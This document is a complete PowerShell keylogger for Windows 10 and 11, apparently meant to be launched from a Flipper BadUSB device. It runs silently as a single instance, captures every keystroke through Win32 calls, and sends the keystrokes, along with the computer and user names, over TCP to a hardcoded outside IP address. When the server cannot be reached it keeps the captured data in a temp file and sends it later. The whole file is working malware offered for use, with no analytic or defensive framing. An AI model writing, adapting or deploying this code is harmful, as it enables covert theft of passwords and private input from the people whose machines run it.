# keylogger.ps1 — Windows 10 / 11 (user session, no admin)
# GitHub raw load via Flipper BadUSB → TCP 89.22.229.54:4444
# Compatible: Windows PowerShell 5.1 (default on Win10/11)

#region silence
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
$WarningPreference     = 'SilentlyContinue'
$VerbosePreference     = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
#endregion

#region config
$ServerIP    = '89.22.229.54'
$ServerPort  = 4444
$ConnectMs   = 4000
$FlushEvery  = 20
$TimerMs     = 10000
$BufPath     = Join-Path $env:TEMP 'kl.buf'
$MaxBufBytes = 262144
$MutexName   = 'Local\FlipperKL_Win1011_v1'
#endregion

#region single-instance (Win10/11 re-plug must not stack processes)
$script:Mutex = $null
try {
    $script:Mutex = New-Object System.Threading.Mutex($false, $MutexName)
    if (-not $script:Mutex.WaitOne(0, $false)) { exit 0 }
} catch {
    # if mutex fails, continue single run anyway
}
#endregion

#region TLS for any future HTTPS (Win10 needs explicit Tls12; Win11 ok with Tls12|Tls13)
try {
    $tls = [enum]::Parse([Net.SecurityProtocolType], 'Tls12')
    try { $tls = $tls -bor [enum]::Parse([Net.SecurityProtocolType], 'Tls13') } catch {}
    [Net.ServicePointManager]::SecurityProtocol = $tls
} catch {
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
}
#endregion

function Send-Log {
    param([string]$Data)
    if ([string]::IsNullOrEmpty($Data)) { return $false }
    $client = $null
    $stream = $null
    try {
        # Force IPv4 — Win11 dual-stack sometimes stalls on broken IPv6 first
        $ip = [Net.IPAddress]::Parse($ServerIP)
        $client = New-Object System.Net.Sockets.TcpClient($ip.AddressFamily)
        $iar = $client.BeginConnect($ip, $ServerPort, $null, $null)
        if (-not $iar.AsyncWaitHandle.WaitOne($ConnectMs, $false)) {
            try { $client.Close() } catch {}
            return $false
        }
        try { $client.EndConnect($iar) } catch { return $false }
        if (-not $client.Connected) { return $false }
        $stream = $client.GetStream()
        $stream.WriteTimeout = $ConnectMs
        $stream.ReadTimeout  = $ConnectMs
        $bytes = [Text.Encoding]::UTF8.GetBytes($Data)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
        return $true
    } catch {
        return $false
    } finally {
        if ($stream) { try { $stream.Close() } catch {} }
        if ($client) { try { $client.Close() } catch {} }
    }
}

function Append-Local {
    param([string]$Data)
    try {
        $dir = Split-Path -Parent $BufPath
        if ($dir -and -not (Test-Path -LiteralPath $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }
        $fi = Get-Item -LiteralPath $BufPath -ErrorAction SilentlyContinue
        if ($fi -and $fi.Length -gt $MaxBufBytes) {
            $tail = [IO.File]::ReadAllText($BufPath)
            if ($tail.Length -gt 8192) { $tail = $tail.Substring($tail.Length - 8192) }
            [IO.File]::WriteAllText($BufPath, $tail + $Data)
        } else {
            [IO.File]::AppendAllText($BufPath, $Data, [Text.Encoding]::UTF8)
        }
    } catch {}
}

function Flush-Queue {
    param([System.Text.StringBuilder]$Sb)
    if ($null -eq $Sb -or $Sb.Length -eq 0) { return }
    $chunk = $Sb.ToString()
    [void]$Sb.Clear()
    if (-not (Send-Log $chunk)) { Append-Local $chunk }
}

#region Win32 — GetAsyncKeyState + ToUnicode (correct layout on Win10/11)
$API = $null
try { $API = [FlipperKL.KLApi] } catch { $API = $null }
if ($null -eq $API) {
    $cs = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace FlipperKL {
  public static class KLApi {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern short GetKeyState(int nVirtKey);
    [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType);
    [DllImport("user32.dll")] public static extern IntPtr GetKeyboardLayout(uint idThread);
    [DllImport("user32.dll")]
    public static extern int ToUnicodeEx(
      uint wVirtKey, uint wScanCode, byte[] lpKeyState,
      [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
      int cchBuff, uint wFlags, IntPtr dwhkl);

    public static string VkToString(int vk) {
      byte[] state = new byte[256];
      for (int i = 0; i < 256; i++) {
        short s = GetAsyncKeyState(i);
        // high bit set = down
        if ((s & 0x8000) != 0) state[i] = 0x80;
      }
      // caps toggle bit
      if ((GetKeyState(0x14) & 0x0001) != 0) state[0x14] = (byte)(state[0x14] | 0x01);

      uint scan = MapVirtualKey((uint)vk, 0);
      IntPtr hkl = GetKeyboardLayout(0);
      StringBuilder sb = new StringBuilder(8);
      int rc = ToUnicodeEx((uint)vk, scan, state, sb, sb.Capacity, 0, hkl);
      if (rc > 0) return sb.ToString();
      // dead key consumed — clear state with a second call sometimes needed
      if (rc < 0) {
        StringBuilder sb2 = new StringBuilder(8);
        ToUnicodeEx((uint)vk, scan, state, sb2, sb2.Capacity, 0, hkl);
        return "";
      }
      return null;
    }
  }
}
'@
    try { Add-Type -TypeDefinition $cs -Language CSharp -ErrorAction Stop | Out-Null } catch {}
    try { $API = [FlipperKL.KLApi] } catch { $API = $null }
}
if ($null -eq $API) { exit 0 }
#endregion

function Map-Key([int]$vk) {
    # named specials first (stable tokens in logs)
    switch ($vk) {
        0x08 { return '[BS]' }
        0x09 { return '[TAB]' }
        0x0D { return "[ENT]`n" }
        0x1B { return '[ESC]' }
        0x2E { return '[DEL]' }
        0x25 { return '[LEFT]' }
        0x26 { return '[UP]' }
        0x27 { return '[RIGHT]' }
        0x28 { return '[DOWN]' }
        0x14 { return '[CAPS]' }
        0x5B { return '[WIN]' }
        0x5C { return '[RWIN]' }
        0x10 { return '' }
        0xA0 { return '' }
        0xA1 { return '' }
        0x11 { return '' }
        0xA2 { return '' }
        0xA3 { return '' }
        0x12 { return '' }
        0xA4 { return '' }
        0xA5 { return '' }
        0x5D { return '[APP]' }
        0x2C { return '[PRTSC]' }
        0x91 { return '[SCRLK]' }
        0x13 { return '[PAUSE]' }
        0x21 { return '[PGUP]' }
        0x22 { return '[PGDN]' }
        0x23 { return '[END]' }
        0x24 { return '[HOME]' }
        0x2D { return '[INS]' }
    }
    if ($vk -ge 0x70 -and $vk -le 0x7B) { return ('[F' + ($vk - 0x6F) + ']') }

    # Win10/11: resolve via current keyboard layout (EN/RU/etc.)
    try {
        $s = $API::VkToString($vk)
        if ($null -ne $s -and $s.Length -gt 0) { return $s }
    } catch {}

    # fallback US-ish
    $shift = ($API::GetKeyState(0x10) -band 0x8000) -ne 0
    if ($vk -ge 0x30 -and $vk -le 0x39) {
        if (-not $shift) { return [string][char]$vk }
        return ')!@#$%^&*('.Substring($vk - 0x30, 1)
    }
    if ($vk -ge 0x41 -and $vk -le 0x5A) {
        $caps = ($API::GetKeyState(0x14) -band 0x0001) -ne 0
        $upper = $caps -xor $shift
        if ($upper) { return [string][char]$vk }
        return [string][char]($vk + 32)
    }
    return $null
}

#region banner (OS build helps when reading server logs)
$osCaption = ''
$osBuild = ''
try {
    $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue
    if ($os) {
        $osCaption = [string]$os.Caption
        $osBuild = [string]$os.BuildNumber
    }
} catch {
    try {
        $osCaption = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -ErrorAction SilentlyContinue).ProductName
        $osBuild = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -ErrorAction SilentlyContinue).CurrentBuild
    } catch {}
}
$psVer = $PSVersionTable.PSVersion.ToString()
$banner = "--- host=$env:COMPUTERNAME user=$env:USERNAME os=$osCaption build=$osBuild ps=$psVer ts=$([DateTime]::UtcNow.ToString('o')) ---`n"
[void](Send-Log $banner)
Append-Local $banner
#endregion

$sb = New-Object System.Text.StringBuilder 4096
$lastFlush = [Environment]::TickCount

try {
    while ($true) {
        try {
            for ($k = 8; $k -le 254; $k++) {
                # skip mouse buttons 1-6 if in range; we start at 8
                $st = $API::GetAsyncKeyState($k)
                if (($st -band 0x0001) -eq 0) { continue }
                $ch = Map-Key $k
                if ($null -eq $ch -or $ch -eq '') { continue }
                [void]$sb.Append($ch)
                if ($sb.Length -ge $FlushEvery) {
                    Flush-Queue $sb
                    $lastFlush = [Environment]::TickCount
                }
            }
            $now = [Environment]::TickCount
            $delta = [int]($now - $lastFlush)
            if ($delta -lt 0) { $delta = $TimerMs }
            if ($delta -ge $TimerMs) {
                Flush-Queue $sb
                try {
                    if (Test-Path -LiteralPath $BufPath) {
                        $offline = [IO.File]::ReadAllText($BufPath)
                        if ($offline.Length -gt 0 -and (Send-Log $offline)) {
                            Remove-Item -LiteralPath $BufPath -Force -ErrorAction SilentlyContinue
                        }
                    }
                } catch {}
                $lastFlush = $now
            }
        } catch {}
        Start-Sleep -Milliseconds 10
    }
} finally {
    try { if ($script:Mutex) { $script:Mutex.ReleaseMutex() | Out-Null } } catch {}
    try { if ($script:Mutex) { $script:Mutex.Dispose() } } catch {}
}
